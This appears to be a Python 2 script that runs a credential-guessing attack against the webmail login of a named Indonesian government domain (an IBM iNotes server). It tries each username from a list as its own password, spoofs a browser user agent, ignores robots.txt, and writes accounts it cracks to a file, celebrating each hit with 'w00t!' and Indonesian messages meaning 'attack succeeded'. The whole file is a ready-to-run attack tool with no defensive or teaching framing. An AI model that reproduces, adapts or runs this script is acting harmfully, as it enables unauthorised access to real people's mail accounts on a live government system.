# -*- coding: utf-8 -*-
import mechanize
import cookielib
import re
import urllib
from bs4 import BeautifulSoup 
import string
import time
import os
import sys

a=13
b=True
c=0
d=range(33)
page = 1
pagefrom = 0
pagelast = 891
pageadding=29
paging = True
# Browser
browser = mechanize.Browser()

# Cookie Jar
cj = cookielib.LWPCookieJar()
browser.set_cookiejar(cj)

# Browser options
browser.set_handle_equiv(True)
browser.set_handle_gzip(True)
browser.set_handle_redirect(True)
browser.set_handle_referer(True)
browser.set_handle_robots(False)
browser.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.517.41 Safari/534.7')]



with open('listuser2') as temp_file:
	isinya = [line.rstrip('\n') for line in temp_file]

for aw in isinya:
	response = browser.open('https://mail.postel.go.id/')
	browser.select_form(nr=0)
	browser.form['Username'] = aw
	browser.form['Password'] = aw
	response = browser.submit()

	response2 = browser.open('https://mail.postel.go.id/')
	html = BeautifulSoup(response2.read())
	nyari = html.body.title
	#print nyari
	login_success='<title>IBM iNotes Redirect for {0}</title>' .format(aw)
	if str(nyari).lower() in str(login_success).lower():
		wow = '[+] w00t! w00t!\n[+] Serang {0} dengan password {1} => Berhasil Login' .format(aw, aw)
		urlSite = html.body.find_all('meta',{'http-equiv':'refresh'})[0]['content'].split('=')[1].split('/')[4].split('?')[0]
		logout = 'https://mail.postel.go.id/mail/{0}/iNotes/Mail/?Logout&Form=m_LogoutDone' .format(str(urlSite))
		with open("berhasilcrack222", "a") as text_file:
			text_file.write("{0}\n" .format(wow))
		print wow
		#try:
		#	code = browser.open(logout)
		#	if code.code=='404':
		#		print "wut?? return code 404?"
		#except (mechanize.HTTPError,mechanize.URLError) as e:
		#    if isinstance(e,mechanize.HTTPError):
		#        print e.code
		#    else:
		#        print e.reason.args
	else:
		print '[-] Serang {0} dengan password {1} => Gagal Login' .format(aw, aw)

	cj.clear_session_cookies()

#print '{0}' .format(nyari)
#print login_success
